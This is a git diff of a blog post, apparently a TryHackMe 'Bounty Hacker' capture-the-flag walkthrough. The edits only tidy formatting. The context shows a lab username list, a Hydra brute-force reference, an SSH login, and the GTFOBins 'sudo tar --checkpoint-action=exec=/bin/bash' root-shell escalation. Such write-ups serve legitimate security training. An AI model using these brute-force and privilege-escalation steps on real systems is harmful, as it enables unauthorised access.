@@ -163,7 +163,6 @@ Now we have a list of potential passwords and addition to possible usernames.
 {% highlight console %}
 m0rn1ngstr@kali:~/THM/BountyHacker$ cat users.txt 
 vicious
-*Side-note: I am not familiar with "Cowboy Bebop" fandom, so the user list is created only based on names I came across during the walkthrough. I am sure that it can be filtered more.*
 lin
 redeye
 spike
@@ -174,7 +173,7 @@ user
 root
 {% endhighlight %}
 
-*Side-note: I am not familiar with "Cowboy Bebop" fandom, so the user list is created only based on names I came across during walkthrough. I am sure that it can be filtered more.*
+*Side-note: I am not familiar with "Cowboy Bebop" fandom, so the user list is created only based on names I came across during the walkthrough. I am sure that it can be filtered more.*
 
 ## Gaining Shell and User flag
 
@@ -198,7 +197,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 07:17:
 
 Now we got credentials and can log in `ssh` and read `user.txt`
 
-###SSH
+### SSH
 
 {% highlight console %}
 m0rn1ngstr@kali:~/THM/BountyHacker$ ssh lin@10.10.238.239
@@ -226,7 +225,7 @@ lin@bountyhacker:~/Desktop$
 {% endhighlight %}
 
 ## Privilege escalation and Root flag
-Let's check which command can Lin run with sudo
+Let's check which command can `Lin` run with `sudo`
 {% highlight console %}
 lin@bountyhacker:~/Desktop$ sudo -l
 [sudo] password for lin: 
@@ -239,7 +238,7 @@ User lin may run the following commands on bountyhacker:
 
 {% endhighlight %}
 
-We can escalate privileges using [gtfobins](https://gtfobins.github.io/gtfobins/tar/)
+We can escalate privileges with `tar` using [gtfobins](https://gtfobins.github.io/gtfobins/tar/)
 {% highlight console %}
 lin@bountyhacker:~/Desktop$ sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
 /bin/tar: Removing leading `/' from member names
